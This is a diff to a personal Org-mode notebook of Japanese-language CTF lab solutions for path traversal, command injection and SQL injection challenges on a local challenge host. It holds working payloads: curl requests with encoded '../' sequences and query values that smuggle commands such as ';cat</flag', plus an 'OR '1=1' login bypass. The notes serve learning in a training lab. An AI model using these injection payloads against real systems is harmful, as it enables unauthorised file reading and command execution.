@@ -1,6 +1,7 @@
 #+OPTIONS: d:nil
 
-* TODO Path Traversal 1
+* Content Injection [1/6]
+** TODO Path Traversal 1
 #+NAME: server
 #+begin_src python
 #!/usr/bin/exec-suid -- /usr/bin/python3 -I
@@ -35,7 +36,7 @@ app.run("challenge.localhost", 80)
 #+begin_src shell :eval no
 curl --path-as-is http://challenge.localhost/package/../../flag
 #+end_src
-* DONE Path Traversal 2
+** DONE Path Traversal 2
 CLOSED: [2026-06-09 火 23:32]
 :LOGBOOK:
 - CLOSING NOTE [2026-06-09 火 23:32] \\
@@ -89,9 +90,9 @@ app.run("challenge.localhost", 80)
 #+begin_src shell
 curl "challenge.localhost/serve/fortunes/..%2F..%2F..%2Fflag"
 #+end_src
-** 参考
+*** 参考
 1. [[https://blog.hamayanhamayan.com/entry/2021/12/08/220449][CTFのWebセキュリティにおけるPath Traversal, LFI/RFI (File Upload, ZipSlip) - はまやんはまやんはまやん]]
-* TODO CMDi 1
+** TODO CMDi 1
 :LOGBOOK:
 - Note taken on [2026-06-10 水 09:16] \\
   #+begin_comment
@@ -152,12 +153,12 @@ curl "http://challenge.localhost:80/resource?dir=;cat%20/flag"
 #+begin_src shell
 curl "http://challenge.localhost:80/resource?dir=;cat</flag"
 #+end_src
-* TODO CMDi 2
+** TODO CMDi 2
 
 #+begin_src shell
 curl "http://challenge.localhost/event?top-path=%0acat</flag"
 #+end_src
-* CMDi 3
+** CMDi 3
 ~ls -l~ には、 ~''~ があるので、なにかしらの引数を与えないとエラーになる。
 そこで、現在のディレクトリを表す ~.~ などを指定して、いったん ~'~ で閉じる。
 今回は ~;~ の使用は制限されていないので、その後に続けて、フラグを覗くコマンドを与える。
@@ -166,28 +167,28 @@ curl "http://challenge.localhost/event?top-path=%0acat</flag"
 #+begin_src shell
 curl "http://challenge.localhost/test?filedir=.';cat</flag'"
 #+end_src
-* CMDi 4
+** CMDi 4
 最後の ~;~ を忘れずに。
 
 #+begin_src shell
 curl "http://challenge.localhost/event?time-zon=;cat</flag;"
 #+end_src
-* CMDi 5
+** CMDi 5
 これでいいのか？
 
 #+begin_src shell
 curl "http://challenge.localhost/activity?file-loc=empty.txt;cat%20/flag%20>%20flag";cat flag
 #+end_src
 
-* CMDi 6
+** CMDi 6
 だいたいの文字が弾かれるようになっているので、改行で区切る。
 
 #+begin_src shell
 curl "http://challenge.localhost/goal?subdirectory=%0acat%20/flag"
 #+end_src
-* TODO Authentication Bypass 1
-* TODO Authentication Bypass 2
-* SQLi 1
+** TODO Authentication Bypass 1
+** TODO Authentication Bypass 2
+** SQLi 1
 とりあえず python でスクリプトを組んだ。
 
 #+begin_src python :eval no
@@ -220,7 +221,7 @@ python exploit.py | grep 'flag'
 #+begin_comment
 9 day streak...
 #+end_comment
-* SQLi 2
+** SQLi 2
 サーバーの以下の部分で ~username~ に ~admin~ を指定し、加えて ~password = '' OR '1=1'~ として、条件を真にする。
 よって、 ~pword~ で指定する文字列は ~'OR '1=1~ となる。
 
